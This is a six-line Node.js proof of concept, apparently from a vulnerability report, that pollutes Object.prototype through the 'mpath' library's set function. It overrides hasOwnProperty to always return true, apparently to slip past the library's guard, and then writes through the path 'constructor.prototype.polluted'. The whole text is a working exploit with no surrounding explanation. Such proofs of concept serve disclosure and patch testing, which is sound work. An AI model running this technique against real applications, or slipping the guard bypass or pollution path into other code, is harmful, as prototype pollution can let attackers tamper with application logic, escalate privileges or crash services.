Object.prototype.hasOwnProperty = () => true;
var mpath = require('mpath');
var obj = {};
console.log({}.polluted);
mpath.set('constructor.prototype.polluted', 'yes', obj);
console.log({}.polluted);